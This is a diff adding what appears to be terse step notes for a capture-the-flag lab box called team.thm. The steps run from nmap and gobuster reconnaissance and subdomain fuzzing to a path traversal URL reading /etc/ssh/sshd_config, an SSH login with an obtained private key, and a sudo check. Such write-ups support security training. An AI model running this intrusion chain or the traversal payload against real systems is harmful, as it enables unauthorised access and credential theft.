@@ -1,0 +1,13 @@
+1 - nmap -A 10.10.57.113
+2 - echo "10.10.57.113 team.thm" | tee -a /etc/hosts
+3 - gobuster dir -u http://team.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - gobuster dir -u http://team.thm/scripts/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+5 - http://team.thm/scripts/script.txt
+6 - http://team.thm/scripts/script.old
+7 - ftp team.thm
+8 - wfuzz -u http://team.thm -H "Host: FUZZ.team.thm" --hw 977 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+9 - echo "10.10.57.113 dev.team.thm" | tee -a /etc/hosts
+10 - view-source:http://dev.team.thm/script.php?page=../../../etc/ssh/sshd_config
+11 - ssh -i id_rsa dale@10.10.57.113
+12 - sudo -l
+13 - 
